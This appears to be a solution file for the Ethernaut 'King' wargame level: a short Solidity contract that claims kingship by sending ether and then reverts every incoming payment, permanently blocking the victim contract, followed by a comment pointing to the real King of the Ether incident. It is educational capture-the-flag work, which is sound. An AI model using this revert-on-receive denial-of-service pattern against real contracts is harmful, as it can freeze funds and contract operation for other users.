pragma solidity ^0.8.0;

contract AttackKing {
    constructor(address _vitimContractAddress) public payable {
        address(_vitimContractAddress).call{value: msg.value}("");
    }

    // Fallback is called when King sends Ether to this contract
    fallback() external payable {
        revert();
    }
}

/*
  Result:

  Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.

  In this case, see: King of the Ether and King of the Ether Postmortem.
  https://www.kingoftheether.com/thrones/kingoftheether/index.html
  https://www.kingoftheether.com/postmortem.html

*/
